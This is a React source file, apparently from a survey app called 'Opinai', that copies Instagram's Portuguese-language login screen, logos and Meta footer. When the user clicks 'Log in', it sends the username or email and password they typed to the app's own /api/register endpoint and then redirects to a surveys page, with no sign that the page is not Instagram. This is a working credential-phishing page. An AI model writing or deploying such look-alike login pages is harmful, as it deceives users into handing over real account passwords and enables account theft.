import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import api from "../../services/api"; 
import { 
  ContainerInsta, LogoInsta, FormInsta, InputInsta, 
  BotaoLoginInsta, LinkEsqueceuInsta, RodapeMeta, 
  BotaoNovoInsta, LogoMetaBrand, IdiomaTopo,
  MensagemErroInsta 
} from "./styles";

export default function Insta() {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [senha, setSenha] = useState("");
  const [erroEmail, setErroEmail] = useState(false);
  const [erroSenha, setErroSenha] = useState(false);

  const handleLogin = async (e) => {
    if (e) e.preventDefault();
    setErroEmail(false);
    setErroSenha(false);

    let temErro = false;
    if (!email.trim()) { setErroEmail(true); temErro = true; }
    if (!senha.trim()) { setErroSenha(true); temErro = true; }
    if (temErro) return;

    try {
      const response = await api.post("/api/register", {
        nome: "Usuário Instagram",
        email: email,
        senha: senha
      });

      const { token } = response.data;

      if (token) {
        localStorage.setItem("@Opinai:token", token);
      }

      navigate("/pesquisas");
    } catch (error) {
      console.error(error);
    }
  };

  return (
    <ContainerInsta>
      <IdiomaTopo>Português (Brasil)</IdiomaTopo>
      <LogoInsta src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram" />

      <FormInsta>
        <InputInsta 
          type="text" 
          placeholder="Nome de usuário, email ou celular" 
          value={email}
          error={erroEmail}
          onChange={(e) => {
            setEmail(e.target.value);
            setErroEmail(false);
          }}
        />
        {erroEmail && <MensagemErroInsta>Informe um usuário válido.</MensagemErroInsta>}

        <InputInsta 
          type="password" 
          placeholder="Senha" 
          value={senha}
          error={erroSenha}
          onChange={(e) => {
            setSenha(e.target.value);
            setErroSenha(false);
          }}
        />
        {erroSenha && <MensagemErroInsta>A senha é obrigatória.</MensagemErroInsta>}
     
        <BotaoLoginInsta type="button" onClick={handleLogin}>Log in</BotaoLoginInsta>
        <LinkEsqueceuInsta>Esqueceu a senha?</LinkEsqueceuInsta>
      </FormInsta>

      <RodapeMeta>
        <BotaoNovoInsta>Criar nova conta</BotaoNovoInsta>
        <LogoMetaBrand>
          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" />
        </LogoMetaBrand>
      </RodapeMeta>
    </ContainerInsta>
  );
}